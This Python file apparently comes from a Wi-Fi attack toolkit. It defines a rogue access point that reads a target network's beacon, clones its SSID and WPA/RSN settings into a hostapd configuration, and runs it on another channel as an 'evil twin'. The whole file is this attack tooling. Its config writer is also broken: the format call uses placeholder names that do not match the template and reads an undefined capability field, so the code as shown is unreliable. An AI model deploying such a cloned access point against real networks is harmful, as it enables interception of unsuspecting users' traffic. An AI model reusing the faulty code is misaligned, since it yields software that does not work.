import os, sys
sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'scapy'))
from scapy.all import *  # noqa: E402
from scapy.arch.linux import L2Socket, attach_filter
from wpaspy import Ctrl

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import struct, subprocess, time, atexit
from utils import *


class RogueAP:

    class NetworkConfig:
        def __init__(self, outer_ap):
                self.ap = outer_ap

                self.ssid = None
                self.channel = 0
                self.wpa_version = 0
                self.auth_key_mgmts = set()
                self.pairwise_ciphers = set()
                self.group_cipher = None
                self.wmm_enabled = 0
                self.rsn_capab = 0
                
        def is_wparsn(self):
            return not self.group_cipher is None and self.wpa_version > 0 and \
                len(self.pairwise_ciphers) > 0 and len(self.auth_key_mgmts) > 0
        
        # TODO: Improved parsing to handle more networks
        def parse_wparsn(self, wparsn):
            self.group_cipher = wparsn[5]

            num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
            pos = wparsn[8:]
            for i in range(num_pairwise):
                self.pairwise_ciphers.add(pos[3])
                pos = pos[4:]

            num_akm = struct.unpack("<H", pos[:2])[0]
            pos = pos[2:]
            for i in range(num_akm):
                self.auth_key_mgmts.add(pos[3])
                pos = pos[4:]

            if len(pos) >= 2:
                self.rsn_capab = struct.unpack("<H", pos[:2])[0]

        def from_beacon(self, p):
            el = p[Dot11Elt]
            while isinstance(el, Dot11Elt):
                if el.ID == IEEE_TLV_TYPE_SSID:
                    self.ssid = el.info
                elif el.ID == IEEE_TLV_TYPE_CHANNEL:
                    self.channel = el.info[0]
                elif el.ID == IEEE_TLV_TYPE_RSN:
                    self.parse_wparsn(el.info)
                    self.wpa_version |= 2
                elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x01":
                    self.parse_wparsn(el.info[4:])
                    self.wpa_version |= 1
                elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x02":
                    self.wmm_enabled = 1

                el = el.payload

        def is_valid(self):
            if not self.channel in range(1, 14):
                log(ERROR, "Attack against 5 GHz networks are not yet supported.")
            elif not self.is_wparsn():
                log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
            # TODO Need more validation?
            else:
                return True
            self.ap.set_status(RogueAP.Configure_Error)
            return False
        
        def write_config(self, iface):
            TEMPLATE = """
ctrl_interface=hostapd_ctrl
ctrl_interface_group=0

interface={iface}
ssid={ssid}
hw_mode=g
channel={channel}

wpa={wpa_version}
wpa_key_mgmt={auth_key_mgmts}
wpa_pairwise={pairwise_ciphers}
rsn_pairwise={pairwise_ciphers}
rsn_ptksa_counters={ptksa_replay_counters}
rsn_gtksa_counters={gtksa_replay_counters}

wmm_enabled={wmm_enabled}
wmm_advertised={wmm_enabled}

auth_algs=3
wpa_passphrase=XXXXXXXX"""
            akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
            ciphers2str = {2: "TKIP", 4: "CCMP"}
            return TEMPLATE.format(
                iface=iface,
                ssid=self.ssid,
                channel=self.channel,
                wpaver=self.wpa_version,
                akms=" ".join([akm2str[idx] for idx in self.auth_key_mgmts]),
                pairwise=" ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
                ptksa_counters=(self.capab & 0b001100) >> 2,
                gtksa_counters=(self.capab & 0b110000) >> 4,
                wmmadvertised=self.wmm_enabled,
                wmmenabled=self.wmm_enabled)


    Unconfigured, Configure_Error, Interface_Error, Down, Starting, Active, Error = range(7)

    def __init__(self):
        self.status = RogueAP.Unconfigured
        self.netconfig = self.NetworkConfig(self)
        
        self.hostapd = None
        self.hostapd_log = None
        self.hostapd_ctrl = None

        self.clients = dict()
        
    def set_status(self, status):
        log(DEBUG, "Rogue AP is now in status %d" % (status), showtime=False)
        self.status = status

    def setup(self, *args, **kargs):
        self.netconfig = self.NetworkConfig(*args, **kargs)
        return self.netconfig.is_valid()

    def evil_twin(self, beacon_p):
        self.netconfig.from_beacon(beacon_p)
        return self.netconfig.is_valid()
        
    # TODO: Check that there also isn't a real AP of this network on
    # the returned channel (possible for large networks e.g. eduroam).
    def find_rogue_channel(self):
        self.netconfig.channel = 1 if self.netconfig.channel >= 6 else 11

    def run(self, iface, update_conf=True):
        if not update_conf and self.status == RogueAP.Unconfigured:
            log(WARNING, "Cannot check if the network configurations are correct")
            self.set_status(RogueAP.Down)
        if not self.status == RogueAP.Down: return False
        self.set_status(RogueAP.Starting)
        if update_conf:
            # Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
            with open("hostapd_rogue.conf", "w") as fp:
                fp.write(self.netconfig.write_config(iface))
        self.hostapd = subprocess.Popen(["../hostap-ct/hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.hostapd_log = open("hostapd_rogue.log", "w")

        log(STATUS, "Giving the rogue hostapd one second to initialize ...")
        time.sleep(1)

        self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + iface)
        self.hostapd_ctrl.attach()

        self.set_status(RogueAP.Active)
        while True:
            if update_conf:
                log(STATUS, "RogueAP <%s[%s]> is currently ACTIVE on channel %d" % (self.netconfig.ssid, "??:??:??:??:??:??", self.netconfig.channel), color="green")
            else:
                log(STATUS, "RogueAP is currently ACTIVE, configured by 'hostapd_rogue.conf'", color="green")
            time.sleep(30)
        

    def stop(self):
        log(STATUS, "Closing hostapd and cleaning up ...")
        if self.hostapd:
            self.hostapd.terminate()
            self.hostapd.wait()
        if self.hostapd_log:
            self.hostapd_log.close()
        


def cleanup():
    rogue_ap.stop()


if __name__ == "__main__":
    rogue_ap = RogueAP()

    atexit.register(cleanup)
    rogue_ap.run('wlan1', update_conf=False)
